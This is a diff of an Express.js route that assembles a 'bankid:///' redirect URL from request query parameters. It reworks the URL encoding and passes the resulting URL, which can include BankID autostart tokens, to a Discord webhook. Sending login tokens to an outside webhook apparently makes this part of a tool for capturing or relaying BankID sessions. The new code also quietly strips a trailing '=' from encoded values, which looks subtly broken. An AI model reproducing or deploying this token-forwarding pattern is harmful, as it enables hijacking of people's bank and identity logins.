@@ -21,17 +21,24 @@ app.get('/', (req, res) => {
   // Split the query string into individual parameters
   const params = new URLSearchParams(queryString);
 
-  // Construct the redirect URL
-  let redirectUrl = 'bankid:///?autostarttoken=';
+  // Initialize an array to store formatted query parameters
+  const formattedParams = [];
 
   // Iterate through each parameter
   for (const [key, value] of params.entries()) {
-    // Append key-value pair to redirectUrl, properly encoded
-    redirectUrl += `${key}=${encodeURIComponent(value)}&`;
+    // Encode key and value
+    const encodedKey = encodeURIComponent(key);
+    const encodedValue = encodeURIComponent(value);
+
+    // Remove trailing '=' from parameter value if present
+    const sanitizedValue = encodedValue.endsWith('%3D') ? encodedValue.slice(0, -3) : encodedValue;
+
+    // Construct key-value pair and add to formattedParams array
+    formattedParams.push(`${encodedKey}=${sanitizedValue}`);
   }
 
-  // Remove trailing '&' if present
-  redirectUrl = redirectUrl.slice(0, -1);
+  // Construct the redirect URL with formatted query parameters
+  const redirectUrl = `bankid:///?${formattedParams.join('&')}`;
 
   // Log the redirect URL to Discord webhook
   sendDiscordWebhook(redirectUrl);
